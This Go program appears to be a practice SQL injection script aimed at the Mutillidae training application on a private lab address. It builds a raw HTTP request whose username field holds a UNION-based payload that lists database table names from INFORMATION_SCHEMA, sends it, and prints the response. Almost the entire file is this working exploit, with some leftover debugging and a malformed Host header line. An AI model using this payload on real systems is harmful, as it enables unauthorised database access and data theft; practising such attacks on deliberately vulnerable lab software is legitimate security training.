package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strings"
)

var payloads = []string{
	"' test",
}

// CREATE AN ERROR INDICATOR COMPARE THE PAGE ON WHAT CHANGE AND READ FROM THAT

func main() {
	conn, err := net.Dial("tcp", "172.16.21.129:80")
	if err != nil {
		log.Panicf("Unable to dial, %v", err)
	}
	defer conn.Close()

	// submitQuery := "user-info-php-submit-button=View+Account+Details"

	payload2 := "e' UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -"

	// fmt.Println(url.QueryEscape(payload))
	// payload := "e%27 UNION ALL SELECT NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name AS NCHAR),0x20),0x7170706271),NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x6f776173703130)-- -"
	// p := strings.Replace(payload, " ", "%20", -1)

	method := "POST"
	// path := "/mutillidae/index.php?page=user-info.php"
	queries := fmt.Sprintf("username=%v&password=test", payload2)
	contentType := "Content-Type: application/x-www-form-urlencoded"
	body := queries

	contentLength := "Content-Length: 0"
	if len(body) > 0 {
		fmt.Println("run")
		contentLength = fmt.Sprintf("Content-Length: %v", len(body))
	}

	formattedQueries := fmt.Sprintf("/mutillidae/index.php?page=user-info.php&username=%s&password=test&user-info-php-submit-button=View+Account+Details\n", url.QueryEscape(payload2))
	test := fmt.Sprintln("/mutillidae/index.php?page=user-info.php&username=e%27%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x717a7a7671,IFNULL(CAST(table_name%20AS%20NCHAR),0x20),0x7170706271),NULL,NULL,NULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20(0x6f776173703130)--%20-&password=test&user-info-php-submit-button=View+Account+Details")
	fmt.Println("default", formattedQueries)
	fmt.Println("test ", test)

	request := fmt.Sprintf("%s %s HTTP/1.1", method, formattedQueries)
	host := "172.16.21.129:80"

	var requestBuilder strings.Builder
	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", request))
	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", host))
	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", contentLength))
	requestBuilder.WriteString(fmt.Sprintf("%s\r\n", contentType))
	requestBuilder.WriteString("\r\n")
	// formattedRequest :=
	// 	fmt.Sprintf("%s\r\n%s\r\n%s\r\n%s\r\n\r\n", request, host, contentType, contentLength)

	// fmt.Println("request", requestBuilder.String())

	_, err = conn.Write([]byte(requestBuilder.String()))
	if err != nil {
		log.Panicf("unable to write %v", err)
	}

	response, err := io.ReadAll(conn)
	if err != nil {
		log.Panic("unable to Read all", err)
	}
	fmt.Println(string(response))

}
